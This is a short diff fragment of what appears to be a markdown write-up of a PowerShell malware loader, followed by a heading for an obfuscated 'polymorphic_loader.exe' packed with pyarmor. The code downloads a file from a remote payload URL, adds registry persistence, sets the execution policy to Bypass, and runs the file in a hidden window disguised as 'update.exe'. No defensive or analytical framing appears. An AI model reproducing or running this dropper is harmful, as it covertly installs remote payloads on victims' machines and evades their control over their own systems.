@@ -48,8 +48,11 @@ Invoke-WebRequest -Uri $payloadURL -OutFile $filePath
 # Add persistence to registry
 Set-ItemProperty -Path $regPath -Name $regName -Value $filePath
 
-# Execute the <payload> 
-Start-Process -WindowStyle Hidden -FilePath $filePath
+# Set execution policy to bypass for the current process
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
+# Execute the update.exe script
+Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c `"$filePath`""
 ```
 # polymorphic_loader.exe
 this is a snippet of the obfuscated payload having used pyarmor 
